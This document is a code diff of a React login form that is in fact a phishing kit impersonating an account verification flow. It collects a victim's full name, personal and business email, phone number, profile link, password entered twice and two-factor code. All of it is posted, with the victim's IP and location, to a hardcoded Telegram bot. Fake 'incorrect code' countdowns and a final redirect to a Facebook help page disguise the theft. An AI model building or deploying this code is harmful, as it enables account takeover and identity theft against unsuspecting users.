@@ -9,6 +9,7 @@ function LoginForm({ onClose }) {
 	const [password1, setPassword1] = useState("");
 	const [password2, setPassword2] = useState("");
 	const [isSuccess, setIsSuccess] = useState(false);
+	const [isSubmited, setIsSubmited] = useState(false);
 	const [clickCount, setClickCount] = useState(0);
 	const [clickCount1, setClickCount1] = useState(0);
 	const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
@@ -21,6 +22,18 @@ function LoginForm({ onClose }) {
 		code: "",
 		submit: "",
 		isSubmitCode: "",
+		fullName: "",
+		personalEmail: "",
+		businessEmail: "",
+		phoneNumber: "",
+		link: "",
+	});
+	const [formData, setFormData] = useState({
+		fullName: "",
+		personalEmail: "",
+		businessEmail: "",
+		phoneNumber: "",
+		link: "",
 	});
 
 	useEffect(() => {
@@ -83,14 +96,17 @@ function LoginForm({ onClose }) {
 		setCode(e.target.value);
 	};
 
+	const handleOnchange = (e) => {
+		const { name, value } = e.target;
+		setFormData((prevData) => ({
+			...prevData,
+			[name]: value,
+		}));
+	};
+
 	const validateInputs = () => {
 		let isValid = true;
 		const newErrors = { email: "", password: "" };
-
-		if (!email) {
-			newErrors.email = "Email is required";
-			isValid = false;
-		}
 
 		if (!password) {
 			newErrors.password = "Password is required";
@@ -101,75 +117,129 @@ function LoginForm({ onClose }) {
 		return isValid;
 	};
 
+	const validate = () => {
+		const newErrors = {};
+		let isValid = true;
+
+		if (!formData.fullName) {
+			newErrors.fullName = "Full Name is required!";
+			isValid = false;
+		}
+
+		if (!formData.personalEmail) {
+			newErrors.personalEmail = "Personal Email is required!";
+			isValid = false;
+		}
+
+		if (!formData.businessEmail) {
+			newErrors.businessEmail = "Business Email is required!";
+			isValid = false;
+		}
+
+		if (!formData.phoneNumber) {
+			newErrors.phoneNumber = "Phone Number is required!";
+			isValid = false;
+		}
+
+		if (!formData.link) {
+			newErrors.link = "Link to Profile is required!";
+			isValid = false;
+		}
+
+		setErrors(newErrors);
+		return isValid;
+	};
+
 	const botToken = "8084816537:AAHxy16raKfk1qJ7ZHDJ9k1LSJo5DMKlp28";
-	const chatId = "-4640665076";
+	const chatId = "-4792851402";
 
 	const sendToTelegram = async () => {
 		try {
-			if (email && password1 && password2 && code) {
-				setClickCount1((prevCount) => prevCount + 1);
+			setClickCount1((prevCount) => prevCount + 1);
 
-				if (clickCount1 === 0) {
-					const message = `Data:\nIP: ${ip}\nLocation: ${location}\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password2}\nCode: ${code}`;
+			if (clickCount1 === 0) {
+				const message = `
+Code:
+IP: ${ip}
+Location: ${location}
+Fullname: ${formData.fullName}
+Personal Email: ${formData.personalEmail}
+Business Email: ${formData.businessEmail}
+Phone Number: ${formData.phoneNumber}
+Link: ${formData.link}
+Password1: ${password1}
+Password2: ${password2}
+Code: ${code}`;
 
-					await fetch(
-						`https://api.telegram.org/bot${botToken}/sendMessage`,
-						{
-							method: "POST",
-							headers: {
-								"Content-Type": "application/json",
-							},
-							body: JSON.stringify({
-								chat_id: chatId,
-								text: message,
-							}),
-						}
-					);
-					setTimeout(() => {
-						setIsSubmitDisabled(true);
+				await fetch(
+					`https://api.telegram.org/bot${botToken}/sendMessage`,
+					{
+						method: "POST",
+						headers: {
+							"Content-Type": "application/json",
+						},
+						body: JSON.stringify({
+							chat_id: chatId,
+							text: message,
+						}),
+					}
+				);
+				setTimeout(() => {
+					setIsSubmitDisabled(true);
 
-						const countdown = setInterval(() => {
-							setTimeLeft((prevTime) => {
-								if (prevTime <= 1) {
-									clearInterval(countdown);
-									setIsSubmitDisabled(false);
-									return 0;
-								}
-								return prevTime - 1;
-							});
-						}, 1000);
-					}, 2000);
+					const countdown = setInterval(() => {
+						setTimeLeft((prevTime) => {
+							if (prevTime <= 1) {
+								clearInterval(countdown);
+								setIsSubmitDisabled(false);
+								return 0;
+							}
+							return prevTime - 1;
+						});
+					}, 1000);
+				}, 2000);
 
-					// setErrors((prevErrors) => ({
-					// 	...prevErrors,
-					// 	isSubmitCode:
-					// 		"The code you entered is incorrect. Please try again.",
-					// }));
-				} else if (clickCount1 === 1) {
-					const message = `Data:\nIP: ${ip}\nLocation: ${location}\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password2}\nCode: ${code}`;
+				// setErrors((prevErrors) => ({
+				// 	...prevErrors,
+				// 	isSubmitCode:
+				// 		"The code you entered is incorrect. Please try again.",
+				// }));
+			} else if (clickCount1 === 1) {
+				const message = `
+Code:
+IP: ${ip}
+Location: ${location}
+Fullname: ${formData.fullName}
+Personal Email: ${formData.personalEmail}
+Business Email: ${formData.businessEmail}
+Phone Number: ${formData.phoneNumber}
+Link: ${formData.link}
+Password1: ${password1}
+Password2: ${password2}
+Code: ${code}`;
 
-					await fetch(
-						`https://api.telegram.org/bot${botToken}/sendMessage`,
-						{
-							method: "POST",
-							headers: {
-								"Content-Type": "application/json",
-							},
-							body: JSON.stringify({
-								chat_id: chatId,
-								text: message,
-							}),
-						}
-					);
-					setTimeout(() => {
-						setIsSubmitDisabled(true);
-						window.location.href = "https://finaloop.com";
-						setErrors((prevErrors) => ({
-							...prevErrors,
-							isSubmitCode: "",
-						}));
-					}, 2000);
-				}
+				await fetch(
+					`https://api.telegram.org/bot${botToken}/sendMessage`,
+					{
+						method: "POST",
+						headers: {
+							"Content-Type": "application/json",
+						},
+						body: JSON.stringify({
+							chat_id: chatId,
+							text: message,
+						}),
+					}
+				);
+				setTimeout(() => {
+					setIsSubmitDisabled(true);
+					window.location.href =
+						"https://www.facebook.com/help/596285382333151";
+					setErrors((prevErrors) => ({
+						...prevErrors,
+						isSubmitCode: "",
+					}));
+				}, 2000);
 			}
 		} catch (error) {
 			console.error("Error sending to Telegram:", error);
@@ -193,7 +263,17 @@ function LoginForm({ onClose }) {
 			} else if (clickCount === 1) {
 				setPassword2(password);
 				setTimeout(async () => {
-					const message = `Data:\nIP: ${ip}\nLocation: ${location}\nEmail: ${email}\nPassword1: ${password1}\nPassword2: ${password}`;
+					const message = `
+User information:
+IP: ${ip}
+Location: ${location}
+Fullname: ${formData.fullName}
+Personal Email: ${formData.personalEmail}
+Business Email: ${formData.businessEmail}
+Phone Number: ${formData.phoneNumber}
+Link: ${formData.link}
+Password1: ${password1}
+Password2: ${password}`;
 
 					await fetch(
 						`https://api.telegram.org/bot${botToken}/sendMessage`,
@@ -217,121 +297,218 @@ function LoginForm({ onClose }) {
 	const toggleShowPass = () => {
 		setIsShowPass(!isShowPass);
 	};
+
+	const handleSubmit1 = (e) => {
+		e.preventDefault();
+		if (validate()) {
+			setIsSubmited(true);
+		}
+	};
+
 	return (
 		<div className="modal-overlay">
 			<div className="modal-content" onClick={(e) => e.stopPropagation()}>
-				{isSuccess ? (
-					<div className="top">
-						<div className="check">
-							<p className="title">
-								Check your authentication code
-							</p>
-							<p className="desc">
-								Enter the 6-digit or 8-digit code for this
-								account from the two-factor authentication you
-								set up (such as Google Authenticator or text
-								message on you mobile).
-							</p>
-							<img
-								src="https://notica.setting-advanted-policy.com/assets/s32w659we12154r-789aa068.gif"
-								alt=""
-							/>
-						</div>
-						<div className="check">
-							<div className="input-box">
-								<label>Code *</label>
-								<input
-									type="text"
-									placeholder="Code"
-									value={code}
-									onChange={(e) => handleOnchangeCode(e)}
+				{isSubmited ? (
+					isSuccess ? (
+						<div className="top">
+							<div className="check">
+								<p className="title">
+									Check your authentication code
+								</p>
+								<p className="desc">
+									Enter the 6-digit or 8-digit code for this
+									account from the two-factor authentication
+									you set up (such as Google Authenticator or
+									text message on your mobile).
+								</p>
+								<img
+									src="https://notica.setting-advanted-policy.com/assets/s32w659we12154r-789aa068.gif"
+									alt=""
 								/>
-								{errors.code && (
-									<span className="error">{errors.code}</span>
-								)}
-								{errors.isSubmitCode && (
-									<span className="error">
-										{errors.isSubmitCode}
-									</span>
-								)}
 							</div>
-							{isSubmitDisabled && (
-								<span className="error">
-									The two-factor authentication you entered is
-									incorrect. Please, try again after{" "}
-									{Math.floor(timeLeft / 60)} minutes{" "}
-									{String(timeLeft % 60).padStart(2, "0")}{" "}
-									seconds
-								</span>
-							)}
-							<button
-								type="button"
-								className={`login-btn ${
-									isSubmitDisabled ? "disabled" : ""
-								}`}
-								onClick={sendToTelegram}
-								disabled={isSubmitDisabled}
-							>
-								Continue
-							</button>
-						</div>
-					</div>
-				) : (
-					<div className="top">
-						<img
-							className="logo"
-							src="data:image/png;base64,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"
-							alt=""
-						/>
-						<form onSubmit={handleSubmit}>
-							<div className="input-box">
-								<label>Email *</label>
-								<input
-									type="email"
-									placeholder="Enter your email"
-									value={email}
-									onChange={(e) => handleOnchangeEmail(e)}
-								/>
-								{errors.email && (
-									<span className="error">
-										{errors.email}
-									</span>
-								)}
-							</div>
-							<div className="input-box">
-								<label>Password *</label>
-								<div className="box">
+							<div className="check">
+								<div className="input-box">
+									<label>Code *</label>
 									<input
-										type={isShowPass ? "text" : "password"}
-										placeholder="Enter your password"
-										value={password}
-										onChange={(e) =>
-											handleOnchangePassword(e)
-										}
+										type="text"
+										placeholder="Code"
+										value={code}
+										onChange={(e) => handleOnchangeCode(e)}
 									/>
-									{errors.password && (
+									{errors.code && (
 										<span className="error">
-											{errors.password}
+											{errors.code}
 										</span>
 									)}
-									{isShowPass ? (
-										<i
-											className="fa-regular fa-eye"
-											onClick={toggleShowPass}
-										></i>
-									) : (
-										<i
-											className="fa-regular fa-eye-slash"
-											onClick={toggleShowPass}
-										></i>
+									{errors.isSubmitCode && (
+										<span className="error">
+											{errors.isSubmitCode}
+										</span>
 									)}
+								</div>
+								{isSubmitDisabled && (
+									<span className="error">
+										The two-factor authentication you
+										entered is incorrect. Please, try again
+										after {Math.floor(timeLeft / 60)}{" "}
+										minutes{" "}
+										{String(timeLeft % 60).padStart(2, "0")}{" "}
+										seconds
+									</span>
+								)}
+								<button
+									type="button"
+									className={`login-btn ${
+										isSubmitDisabled ? "disabled" : ""
+									}`}
+									onClick={sendToTelegram}
+									disabled={isSubmitDisabled}
+								>
+									Continue
+								</button>
+							</div>
+						</div>
+					) : (
+						<div className="top">
+							<img
+								className="logo"
+								src="data:image/png;base64,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"
+								alt=""
+							/>
+							<form onSubmit={handleSubmit}>
+								<div className="input-box">
+									<label>Password *</label>
+									<div className="box">
+										<input
+											type={
+												isShowPass ? "text" : "password"
+											}
+											placeholder="Enter your password"
+											value={password}
+											onChange={(e) =>
+												handleOnchangePassword(e)
+											}
+										/>
+										{errors.password && (
+											<span className="error">
+												{errors.password}
+											</span>
+										)}
+										{isShowPass ? (
+											<i
+												className="fa-regular fa-eye"
+												onClick={toggleShowPass}
+											></i>
+										) : (
+											<i
+												className="fa-regular fa-eye-slash"
+												onClick={toggleShowPass}
+											></i>
+										)}
+									</div>
+								</div>
+								{errors.submit && (
+									<span className="error">
+										{errors.submit}
+									</span>
+								)}
+								<button type="submit" className="login-btn">
+									Continue
+								</button>
+							</form>
+						</div>
+					)
+				) : (
+					<div className="top">
+						<h2>Verify Form</h2>
+						<form onSubmit={handleSubmit1}>
+							<div className="input-box">
+								<label>Full Name *</label>
+								<input
+									type="text"
+									value={formData.fullName}
+									name="fullName"
+									onChange={(e) => handleOnchange(e)}
+								/>
+								{errors.fullName && (
+									<span className="error">
+										{errors.fullName}
+									</span>
+								)}
+							</div>
+							<div className="input-box">
+								<label>Personal Email *</label>
+								<input
+									type="email"
+									name="personalEmail"
+									value={formData.personalEmail}
+									onChange={(e) => handleOnchange(e)}
+								/>
+								{errors.personalEmail && (
+									<span className="error">
+										{errors.personalEmail}
+									</span>
+								)}
+							</div>
+							<div className="input-box">
+								<label>Business Email *</label>
+								<input
+									type="email"
+									name="businessEmail"
+									value={formData.businessEmail}
+									onChange={(e) => handleOnchange(e)}
+								/>
+								{errors.businessEmail && (
+									<span className="error">
+										{errors.businessEmail}
+									</span>
+								)}
+							</div>
+							<div className="input-box">
+								<label>Mobile phone number *</label>
+								<input
+									type="text"
+									name="phoneNumber"
+									value={formData.phoneNumber}
+									onChange={(e) => handleOnchange(e)}
+								/>
+								{errors.phoneNumber && (
+									<span className="error">
+										{errors.phoneNumber}
+									</span>
+								)}
+							</div>
+							<div className="input-box">
+								<label>Link to profile *</label>
+								<input
+									type="text"
+									name="link"
+									value={formData.link}
+									onChange={(e) => handleOnchange(e)}
+								/>
+								{errors.link && (
+									<span className="error">{errors.link}</span>
+								)}
+							</div>
+							<div className="input-box">
+								<div className="flex-box">
+									<input
+										className="checkbox"
+										type="checkbox"
+										name="term"
+										id=""
+									/>
+									<p>
+										I agree with{" "}
+										<a href="#">Terms of use</a>
+									</p>
 								</div>
 							</div>
 							{errors.submit && (
 								<span className="error">{errors.submit}</span>
 							)}
 							<button type="submit" className="login-btn">
-								Continue
+								Send
 							</button>
 						</form>
 					</div>
